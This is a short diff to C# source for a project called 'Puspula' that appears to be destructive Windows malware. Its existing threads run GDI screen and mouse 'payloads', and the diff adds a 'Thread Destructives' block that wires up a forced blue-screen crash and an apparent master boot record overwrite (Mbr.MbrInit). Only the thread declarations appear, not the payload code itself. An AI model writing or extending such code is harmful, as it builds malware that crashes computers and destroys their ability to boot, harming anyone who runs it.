@@ -1,4 +1,4 @@
-﻿using System.Threading;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace Puspula
@@ -50,5 +50,9 @@ namespace Puspula
         public static Thread gd2Mouse = new Thread(GdiPayload.MouseIcoWarn);
         public static Thread gdSpawn1 = new Thread(GdiPayload.SpawnIcoWarn);
         public static Thread tsp1 = new Thread(PayloadSystem.MoveMouse);
+
+        //  Thread Destructives
+        public static Thread BSOD = new Thread(bBsod.Bsod);
+        public static Thread MBR = new Thread(Mbr.MbrInit);
     }
 }
